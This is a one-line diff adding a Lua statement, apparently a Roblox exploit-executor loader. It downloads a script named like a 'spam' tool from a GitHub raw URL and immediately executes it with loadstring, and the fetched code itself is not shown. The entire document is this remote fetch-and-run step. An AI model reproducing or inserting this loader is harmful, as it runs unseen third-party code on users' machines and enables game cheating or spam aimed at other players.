@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/karinderya-spam6-1zse5arugx9qwa.lua"))()
